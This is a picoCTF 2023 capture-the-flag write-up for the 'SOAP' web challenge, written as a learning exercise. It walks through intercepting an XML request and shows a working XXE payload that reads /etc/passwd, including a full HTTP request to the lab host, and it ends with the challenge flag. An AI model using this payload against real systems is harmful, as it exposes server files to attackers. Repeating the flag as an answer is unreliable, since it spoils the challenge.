# SOAP â€“ picoCTF 2023 Writeup
<img width="886" height="529" alt="image" src="https://github.com/user-attachments/assets/837d42c1-5534-445a-8306-90b2834e8210" />



---

## Challenge Description

The challenge provides us with:

- A web application with "Details" buttons for different items
- The hint suggests looking into XXE vulnerabilities
- The objective is to read `/etc/passwd`

---

## Solution

### Step 1: Initial Reconnaissance

After launching the instance, I accessed the web application which displayed a "Computer Science" page featuring three cards:

- Carnegie Mellon University Africa
- PicoCTF
- Upanzi Network

Each card had a "Details" button that triggered an AJAX request to fetch more information.

<img width="886" height="423" alt="image" src="https://github.com/user-attachments/assets/f1d4628c-18e4-4824-84e8-f1de27ded0fe" />


### Step 2: Analyzing the Request

Using Burp Suite, I intercepted the request when clicking a "Details" button. The application was sending XML data to the server:

<img width="789" height="417" alt="image" src="https://github.com/user-attachments/assets/155b4fcb-f963-4fc1-a663-2e9d91db63a7" />

**JavaScript Source Analysis:**

The xmlDetailsCheckPayload.js file revealed how XML payloads were constructed:
<img width="886" height="349" alt="image" src="https://github.com/user-attachments/assets/6734ddaa-f389-4eb7-9870-c7d9ce381d84" />


The detailsCheck.js showed how the request was made:
<img width="886" height="509" alt="image" src="https://github.com/user-attachments/assets/c47a2f3e-2948-49ff-8fa6-ae5b1a5fa6dd" />


### Step 3: Crafting the XXE Payload
Since the server accepts and parses XML input, I crafted a malicious XXE payload to read local files:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<data>
    <ID>
        &xxe;
    </ID>
</data>
Payload Breakdown:

Component	Purpose

<!DOCTYPE foo [...]>	Declares a Document Type Definition (DTD)

<!ENTITY xxe SYSTEM "file:///etc/passwd">	Defines an external entity that reads the local file

&xxe;	References the entity, triggering file inclusion

### Step 4: Sending the Malicious Request
Using Burp Suite Repeater, I sent the crafted payload:

Request:

POST /data HTTP/1.1

Host: saturn.picoctf.net:59826

Content-Length: 139

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36

Content-Type: application/xml

Origin: http://saturn.picoctf.net:59826

Referer: http://saturn.picoctf.net:59826/

Connection: keep-alive

```c
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<data>
    <ID>
        &xxe;
    </ID>
</data>
```

### Step 5: Analyzing the Response
The server processed the XML and returned the contents of /etc/passwd:
<img width="886" height="421" alt="image" src="https://github.com/user-attachments/assets/b00395c5-4bbd-464a-9e57-6939740a3eb5" />

The flag was embedded in the /etc/passwd file as the GECOS field for the picoctf user.

# Flag
picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}
